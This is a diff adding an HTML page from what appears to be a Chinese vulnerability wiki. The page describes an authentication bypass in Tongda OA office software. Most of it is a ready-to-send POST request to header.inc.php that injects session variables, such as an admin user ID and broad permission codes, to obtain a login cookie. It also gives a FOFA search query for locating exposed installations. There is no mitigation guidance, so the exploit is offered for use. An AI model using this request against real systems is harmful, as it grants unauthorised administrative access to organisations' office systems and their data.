@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEOA%20header%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>通达OA header身份认证绕过漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u901a\u8fbeOA header\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-4165/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%80%9A%E8%BE%BEOA%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-4165/" class="btn btn-xs btn-link">
+        通达OA sql注入漏洞 CVE 2023 4165
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%80%9A%E8%BE%BEOA%20get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        通达OA get datas.php前台sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="oa-header">通达OA header身份认证绕过漏洞<a class="headerlink" href="#oa-header" title="Permanent link">&para;</a></h2>
+<p>通达OA（Office Anywhere网络智能办公系统）是中国通达公司的一套协同办公自动化软件，通达OA2013，通达OA2016，通达OA2017 存在身份认证绕过漏洞，攻击者通过构造特定的数据包，获取登录cookie，利用cookie进行未授权访问。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title=&quot;office Anywhere&quot;
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>POST /module/retrieve_pwd/header.inc.php HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1024
+
+_SESSION[LOGIN_THEME]=15&amp;_SESSION[LOGIN_USER_ID]=1&amp;_SESSION[LOGIN_UID]=1&amp;_SESSION[LOGIN_FUNC_STR]=1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,
+</code></pre></div>
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/b5cf4a04-f5e9-47d5-b463-528fac5133c0" /></p>
+<p>第二步：验证cookie是否有效
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/161f8b28-059c-4132-b9b7-8435dd124e14" /></p>
+<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/f44e5dc2-2a95-4900-9f71-9001ef870980" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-4165/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%80%9A%E8%BE%BEOA%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-4165/" class="btn btn-xs btn-link">
+        通达OA sql注入漏洞 CVE 2023 4165
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%80%9A%E8%BE%BEOA%20get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%80%9A%E8%BE%BEOA%20get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        通达OA get datas.php前台sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
